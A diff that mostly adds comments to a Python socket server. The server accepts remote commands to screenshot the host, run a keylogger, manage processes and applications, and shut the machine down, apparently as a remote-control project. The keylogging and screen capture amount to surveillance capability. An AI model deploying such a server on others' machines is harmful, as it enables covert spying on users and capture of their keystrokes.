@@ -29,70 +29,74 @@ EXIT = "exit"
 
 class Server:
     def __init__(self, host):
+        # Initialize the Server class with the given host (IP address or hostname)
         self.host = ''# host
-        print(self.host + " " + str(PORT))
+        print(self.host + " " + str(PORT)) # Print the host and port information
+        # Create a socket using AF_INET for IPv4 and SOCK_STREAM for TCP
         self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #SOCK_STREAM = TCP
         self.server.bind((self.host, PORT))
         self.server.listen(10)
         print("Server started listening on port " + str(PORT))
         self.clients = []
-        self.ns = None
-        self.nr = None
-        self.nw = None
-        self.nr_lock = threading.Lock()
-        self.nw_lock = threading.Lock()
+        self.ns = None # Network stream for reading from the client
+        self.nr = None  # Network stream for reading binary data from the client
+        self.nw = None  # Network stream for writing binary data to the client
+        self.nr_lock = threading.Lock()  # Lock for thread-safe reading
+        self.nw_lock = threading.Lock()  # Lock for thread-safe writing
 
     def start(self):
         try:
             print("SERVER: Waiting for Clients")
             while True:
-                conn, addr = self.server.accept()
-                print("Connected by", addr)
-                self.clients.append((conn, addr))
-                threading.Thread(target=self.handle_client, args=(conn,addr)).start()
-                self.nr = conn.makefile("rb")
-                self.nw = conn.makefile("wb")
+                conn, addr = self.server.accept()  # Accept incoming client connection
+                print("Connected by", addr)  # Print client address
+                self.clients.append((conn, addr))  # Add client connection to the list
+                threading.Thread(target=self.handle_client, args=(conn, addr)).start()
+                # Create a new thread to handle the client and start it
+                self.nr = conn.makefile("rb")  # Create a network stream for reading binary data
+                self.nw = conn.makefile("wb")  # Create a network stream for writing binary data
         except socket.error as ex:
             print("Server error:", ex)
         finally:
-            self.server.close()
+            self.server.close()  # Close the server socket when done
 
     def stop(self):
         self.is_running = False  # Signal the server loop to stop
         for conn, _ in self.clients:
-            conn.close()
-        self.server.close()
-        sys.exit(0)  # Close the socket to unlock the port
+            conn.close()  # Close connections with all clients
+        self.server.close()  # Close the server socket
+        sys.exit(0)  # Exit the program
         
     def handle_client(self, conn, addr):
-        self.clients.append(conn)
+        self.clients.append(conn)  # Add client connection to the list
         try:
             while True:
-                option = conn.recv(1024).decode("utf8")
-                print("Client option: " + option)
+                option = conn.recv(1024).decode("utf8")  # Receive client's command
+                print("Client option: " + option)  # Print the received command
                 if option == "TAKEPIC":
-                    self.screenshot(conn)
+                    self.screenshot(conn)  # Call method to take a screenshot
                 elif option == "SHUTDOWN":
-                    self.shutdown()
+                    self.shutdown()  # Call method to shut down the server
                 elif option == "KEYLOG":
-                    self.keylog(conn)
+                    self.keylog(conn)  # Call method to handle keylogging
                 elif option == "PROCESS":
-                    self.process(conn)
+                    self.process(conn)  # Call method to handle process management
                 elif option == "APPLICATION":
-                    self.application(conn)
+                    self.application(conn)  # Call method to handle application management
                 elif option == "QUIT":
-                    self.stop()
+                    self.stop()  # Call method to stop the server
                     break
                 else:
-                    conn.sendall(bytes("Option not found", "utf8"))
+                    conn.sendall(bytes("Option not found", "utf8"))  # Send an error response
                     break
         except socket.timeout as timeout:
-            print("Timeout to client: ", addr)
+            print("Timeout to client:", addr)  # Handle timeout to client
         except socket.error as error:
-            print("Disconnected to client: ", addr)
-        finally:    
-            conn.close()
-            self.clients.remove((conn, addr))
+            print("Disconnected to client:", addr)  # Handle disconnection from client
+        finally:
+            conn.close()  # Close the connection with the client
+            self.clients.remove((conn, addr))  # Remove client connection from the list
+
 
     def screenshot(self, conn):
         myScreenshot = pyautogui.screenshot()
